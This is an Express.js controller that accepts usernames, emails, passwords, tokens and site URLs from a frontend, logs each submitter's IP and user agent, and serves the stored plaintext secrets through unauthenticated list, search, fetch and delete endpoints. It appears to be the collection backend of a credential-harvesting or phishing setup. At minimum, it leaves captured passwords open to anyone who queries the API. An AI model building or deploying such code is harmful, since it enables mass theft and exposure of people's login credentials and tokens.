const mongoose = require('mongoose');
const Credential = require('../models/Credential');

const inMemoryCredentials = [];
const isDbConnected = () => mongoose.connection.readyState === 1;

// @desc    Save new credential sent from frontend
// @route   POST /api/credentials
// @access  Public
const saveCredentials = async (req, res, next) => {
  try {
    const { username, email, password, token, siteUrl, metadata } = req.body;

    if (!username && !email && !password && !token) {
      return res.status(400).json({
        success: false,
        message: 'Please provide at least one credential field (username, email, password, or token)',
      });
    }

    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];

    if (isDbConnected()) {
      try {
        const credential = await Credential.create({
          username,
          email,
          password,
          token,
          siteUrl,
          clientIp,
          userAgent,
          metadata,
        });

        return res.status(201).json({
          success: true,
          message: 'Credential saved successfully (MongoDB)',
          data: credential,
        });
      } catch (dbErr) {
        console.warn('[CredentialController] DB save failed, fallback to memory store');
      }
    }

    const now = new Date();
    const credential = {
      _id: `cred_${Date.now()}_${Math.random().toString(36).substr(2, 5)}`,
      username,
      email,
      password,
      token,
      siteUrl,
      clientIp,
      userAgent,
      metadata: metadata || {},
      createdAt: now,
      updatedAt: now,
    };
    inMemoryCredentials.unshift(credential);

    return res.status(201).json({
      success: true,
      message: 'Credential saved successfully (In-Memory)',
      data: credential,
    });
  } catch (error) {
    next(error);
  }
};

// @desc    Get all stored credentials
// @route   GET /api/credentials
// @access  Public
const getCredentials = async (req, res, next) => {
  try {
    const { search, limit = 50, page = 1 } = req.query;

    if (isDbConnected()) {
      try {
        const query = {};
        if (search) {
          query.$or = [
            { username: { $regex: search, $options: 'i' } },
            { email: { $regex: search, $options: 'i' } },
            { siteUrl: { $regex: search, $options: 'i' } },
          ];
        }

        const skip = (Number(page) - 1) * Number(limit);
        const credentials = await Credential.find(query)
          .sort({ createdAt: -1 })
          .skip(skip)
          .limit(Number(limit));

        const total = await Credential.countDocuments(query);

        return res.status(200).json({
          success: true,
          count: credentials.length,
          total,
          page: Number(page),
          pages: Math.ceil(total / Number(limit)),
          data: credentials,
        });
      } catch (dbErr) {
        console.warn('[CredentialController] DB fetch failed, using memory credentials');
      }
    }

    let filtered = [...inMemoryCredentials];
    if (search) {
      const q = search.toLowerCase();
      filtered = filtered.filter(
        (c) =>
          (c.username && c.username.toLowerCase().includes(q)) ||
          (c.email && c.email.toLowerCase().includes(q)) ||
          (c.siteUrl && c.siteUrl.toLowerCase().includes(q))
      );
    }

    const total = filtered.length;
    const startIndex = (Number(page) - 1) * Number(limit);
    const paginated = filtered.slice(startIndex, startIndex + Number(limit));

    return res.status(200).json({
      success: true,
      count: paginated.length,
      total,
      page: Number(page),
      pages: Math.ceil(total / Number(limit)) || 1,
      data: paginated,
    });
  } catch (error) {
    next(error);
  }
};

// @desc    Get single credential entry by ID
// @route   GET /api/credentials/:id
// @access  Public
const getCredentialById = async (req, res, next) => {
  try {
    const id = req.params.id;

    if (isDbConnected()) {
      try {
        const credential = await Credential.findById(id);
        if (credential) {
          return res.status(200).json({
            success: true,
            data: credential,
          });
        }
      } catch (dbErr) {
        console.warn('[CredentialController] DB fetch by ID error');
      }
    }

    const cred = inMemoryCredentials.find((c) => c._id === id);
    if (!cred) {
      return res.status(404).json({
        success: false,
        message: 'Credential entry not found',
      });
    }

    return res.status(200).json({
      success: true,
      data: cred,
    });
  } catch (error) {
    next(error);
  }
};

// @desc    Delete credential entry by ID
// @route   DELETE /api/credentials/:id
// @access  Public
const deleteCredential = async (req, res, next) => {
  try {
    const id = req.params.id;

    if (isDbConnected()) {
      try {
        const credential = await Credential.findByIdAndDelete(id);
        if (credential) {
          return res.status(200).json({
            success: true,
            message: 'Credential entry deleted successfully',
          });
        }
      } catch (dbErr) {
        console.warn('[CredentialController] DB delete error');
      }
    }

    const idx = inMemoryCredentials.findIndex((c) => c._id === id);
    if (idx === -1) {
      return res.status(404).json({
        success: false,
        message: 'Credential entry not found',
      });
    }

    inMemoryCredentials.splice(idx, 1);
    return res.status(200).json({
      success: true,
      message: 'Credential entry deleted successfully (In-Memory)',
    });
  } catch (error) {
    next(error);
  }
};

module.exports = {
  saveCredentials,
  getCredentials,
  getCredentialById,
  deleteCredential,
};

